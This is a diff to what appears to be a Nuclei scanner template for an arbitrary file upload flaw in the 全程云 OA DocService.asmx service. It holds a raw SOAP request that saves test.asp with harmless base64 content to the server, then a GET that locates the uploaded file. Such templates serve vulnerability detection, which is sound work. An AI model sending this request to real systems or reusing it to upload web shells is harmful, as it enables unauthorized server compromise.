@@ -3,15 +3,11 @@ info:
   name: 全程云DocumentDocService.asmx接口存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zdgxtto8525ulgyp'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zdgxtto8525ulgyp
-    fofa: body="UserLoginFaster"
 http:
 - raw:
-  - "POST /OA/Document/DocService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: 395\nSOAPAction: \"http://tempuri.org/SaveFile\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SaveFile xmlns=\"http://tempuri.org/\">\n      <bytes>dGVzdDEyMzQ1Ng==</bytes>\n      <filename>test.asp</filename>\n    </SaveFile>\n  </soap:Body>\n</soap:Envelope>\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351487087-f756aa48-1527-4312-9cc2-08f74e0928c3.png)\n上传定位：GET /oa/Upfiles/temp/test.asp HTTP/1.1\n![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730351487310-e09015f5-56f3-4a1d-bea9-6ff624009180.png)"
+  - "POST /OA/Document/DocService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: 395\nSOAPAction: \"http://tempuri.org/SaveFile\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <SaveFile xmlns=\"http://tempuri.org/\">\n      <bytes>dGVzdDEyMzQ1Ng==</bytes>\n      <filename>test.asp</filename>\n    </SaveFile>\n  </soap:Body>\n</soap:Envelope>\n\n上传定位：GET /oa/Upfiles/temp/test.asp HTTP/1.1"
   redirects: false
   matchers:
   - status:
